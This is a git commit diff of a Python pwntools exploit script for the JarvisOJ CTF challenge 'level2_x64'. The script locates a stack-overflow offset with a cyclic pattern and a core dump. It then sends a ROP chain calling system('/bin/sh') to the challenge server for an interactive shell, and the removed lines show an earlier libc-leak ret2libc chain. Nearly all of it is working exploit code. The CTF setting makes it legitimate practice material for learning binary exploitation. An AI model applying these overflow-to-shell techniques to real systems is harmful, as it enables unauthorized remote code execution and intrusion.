9c0207f8a578c5c923d643803e11bafc1547632c
Lays <daitaomail@gmail.com>
2019-05-20 22:23:50 -0700

    complete jarvisoj level2_x64

--- jarvisoj/level2_x64/exp.py
+++ jarvisoj/level2_x64/exp.py
@@ -19,12 +19,13 @@ class Pwn(object):
     def get_overflow_position(self):
         io = self.get_io(False)
         io.recvline()
-        io.send(cyclic(500))
+        io.send(cyclic(600))
         io.recvall()
 
         if os.path.isfile('./core'):
             core = Core('./core')
-            self.rip = cyclic_find(p32(core.rsp))
+            # print 'rsp:', core.rsp
+            self.rip = cyclic_find(core.u32(core.rsp))
             print 'rip:', hex(self.rip)
 
 
@@ -33,40 +34,23 @@ class Pwn(object):
         if remote_sign:
             io = remote(self.host, self.port)
         else:
-            # io = process([self.binary_file], env={"LD_PRELOAD":"./libc-2.19.so"})
-            io = process([self.binary_file], env={"LD_PRELOAD":"./libc-2.19.so"})
+            io = process(self.binary_file)
         return io
 
     
     def get_shell(self):
         io = self.get_io(True)
-        io.recvline()
-        write_got = self.elf.got['write']
-        libc = ELF('./libc.so.6')
-        write_plt = libc.symbols['write']
-        
-        # get write got address
-        rop = ROP(self.binary_file)
-        rop.write(1, write_got, 4)
-        rop.main()
-
-        io.send(fit({self.eip: rop.chain()}))
-        write_got_addr = io.unpack()
-
-        print "write_got_addr:", hex(write_got_addr)
-        libc.address = write_got_addr - write_plt 
-        bin_addr = libc.search('/bin/sh\x00').next()
-        print 'bin_addr:', hex(bin_addr)
-
-        # execute system('/bin/sh')
-        rop = ROP(libc)
+        bin_addr = self.elf.search('/bin/sh').next()
+        # system_addr = self.
+        rop = ROP(self.elf)
         rop.system(bin_addr)
-        io.send(fit({self.eip:rop.chain()}))
+        # io.recvline()
+        io.send(fit({self.rip: rop.chain()}))
         io.interactive()
 
 
 def main():
-    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9879}, binary_file='./level3')
+    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9882}, binary_file='./level2')
     pwn.get_overflow_position()
     pwn.get_shell()
 
